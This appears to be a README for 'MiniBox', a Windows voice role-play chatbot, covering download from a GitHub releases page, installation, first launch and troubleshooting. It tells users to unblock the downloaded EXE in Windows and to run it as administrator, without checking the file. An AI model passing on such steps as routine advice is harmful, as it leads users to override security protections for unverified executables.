## 🚀 Getting Started

MiniBox is a voice chatbot for character role-play. It uses GPT-SoVITS for speech and an LLM for replies. You can use it on Windows with a web UI, or connect it to an ESP32 figurine client.

This guide shows you how to download MiniBox, set it up, and run it on Windows.

## 📥 Download MiniBox

1. Open the release page: https://github.com/geomancyhombre134/MiniBox/releases
2. Find the latest release
3. Download the Windows file from that page
4. If the release comes as a ZIP file, save it to your computer
5. If the release comes as an EXE file, save that file instead

Use the release page to download and run the Windows version from there.

## 🖥️ Windows Setup

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- At least 8 GB RAM
- 10 GB free disk space
- A working microphone if you want voice input
- Speakers or headphones for voice output
- A stable internet connection for first-time setup

For a smoother run, a modern NVIDIA or AMD graphics card helps with speech and model work. MiniBox can still run on many Windows PCs without special setup for basic use.

## 📦 Install MiniBox

### If you downloaded a ZIP file

1. Find the ZIP file in your Downloads folder
2. Right-click the file
3. Choose Extract All
4. Pick a folder you can find later, such as Desktop or Documents
5. Open the extracted folder
6. Look for the app file or launcher file
7. Double-click it to start MiniBox

### If you downloaded an EXE file

1. Find the EXE file in your Downloads folder
2. Double-click it
3. If Windows asks for permission, choose Yes
4. Wait for the app to open

If Windows blocks the file, open the file properties and allow it, then try again.

## 🎛️ First Launch

When MiniBox starts for the first time, it may take a short while to load files. This is normal.

After the app opens:

1. Choose your language if asked
2. Set your microphone and speaker
3. Open the main chat window
4. Pick a character or voice profile
5. Test voice input and output
6. Start a chat

If the app shows a setup screen, follow the prompts one by one. MiniBox is built for simple use, so the main steps are clear on screen.

## 🧠 What MiniBox Does

MiniBox brings text chat and voice chat together. It can:

- Chat with character-style replies
- Turn text into speech with GPT-SoVITS TTS
- Listen through your microphone
- Run in a web UI on Windows
- Connect to an ESP32 figurine hardware client
- Support role-play style conversations
- Work with voice cloning setups when configured

This makes it useful for anime-style character chats, cosplay rigs, desk companions, and voice-based demos.

## 🎤 How To Use Voice Chat

1. Open MiniBox
2. Select your voice or character
3. Press the talk button or push-to-talk key
4. Speak into your microphone
5. Wait for the reply
6. Hear the character answer in voice

For best results:

- Use a quiet room
- Speak close to the microphone
- Keep your voice steady
- Use headphones to cut echo

If the voice sounds too soft or too loud, open the audio settings and adjust the volume.

## 🔧 Common Problems

### The app does not open

- Check that you extracted the ZIP file first
- Try running the EXE file again
- Right-click the file and choose Run as administrator
- Restart your computer and try once more

### No sound comes out

- Check your speaker or headphone connection
- Make sure the app has the correct output device
- Turn up the system volume
- Test another audio device

### The microphone does not work

- Check Windows microphone permissions
- Select the right microphone in MiniBox
- Make sure the mic is not muted
- Test the mic in another app

### Voice response is slow

- Close other heavy apps
- Give the app a few more seconds on first launch
- Use a faster PC if possible
- Check your internet connection if the app uses online parts

### The web UI does not load

- Make sure MiniBox is still running
- Refresh the browser page
- Check the local address shown by the app
- Try another browser
